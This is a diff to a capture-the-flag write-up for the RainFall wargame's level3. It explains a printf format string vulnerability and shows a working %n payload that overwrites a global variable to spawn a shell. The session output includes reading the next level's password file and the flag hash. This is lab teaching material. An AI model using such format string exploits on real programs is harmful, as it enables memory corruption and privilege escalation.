@@ -16,7 +16,16 @@ It use `fgets` to read input into a buffer which is safe compared to `gets` from
 
 We also see that their is a 'm' variable that is not set in the function, which mean it's a global variable. So if we can set 'm' to 64, we can pass the check and call the shell function.
 
-Something weird, the printf don't have a specifier %, it just print the variable directly. This is a hint that it's probably a format string vulnerability. We need to check if printf have a identifier to write to an address directly, so maybe we can overwrite the 'm' variable ? It seem to be %n.
+Something weird, the printf don't have a specifier %, it just print the variable directly. This is a hint that it's probably a format string vulnerability. We need to check if printf have a identifier to write to an address directly, so maybe we can overwrite the 'm' variable ?
+
+From the man 3 printf
+> If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and  creating  a  security hole.
+
+'%' followed by a number indicates which argument the conversion specifier is applied to.
+
+$n writes the number of characters written so far into to the address pointed to by the argument.
+
+So we can combine `%some_number` and `$n` to write a specific value in the address of our choice.
 
 **Step 3**
 We find the address of m directly in ghidra, it's 0x0804988c. So "\x8c\x98\x04\x08" in little endian.
@@ -32,10 +41,16 @@ AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x2
 So we found that in the fourth position we have our input. So the offset is 4. So we can use %4$n to tell it to get the 4th position and write the number of bytes written until now to that address.
 
 **Step 4**
-Now we need to create the payload. The payload is going to be the address of m + padding + %4$n.
+Now we need to create the payload. The payload is going to be the address of m + nb_of_char_to_reach_64 + %4$n.
 
 ```bash
-(python -c "print '\x8c\x98\x04\x08' + 'A'*60 + '%4\$n'"; cat -) | ./level3
+level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + 'A'*60 + '%4\$n'"; cat -) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
 
